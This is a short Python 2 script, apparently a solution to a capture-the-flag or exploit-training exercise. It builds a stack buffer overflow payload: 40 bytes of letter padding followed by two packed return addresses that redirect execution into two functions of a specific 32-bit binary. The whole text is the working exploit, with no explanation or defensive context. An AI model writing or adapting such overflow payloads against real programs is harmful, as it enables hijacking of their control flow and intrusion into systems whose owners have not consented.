import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"
function1 = struct.pack("I", 0x0804846b)
function2 = struct.pack("I", 0x0804847e)
print padding+function1+function2
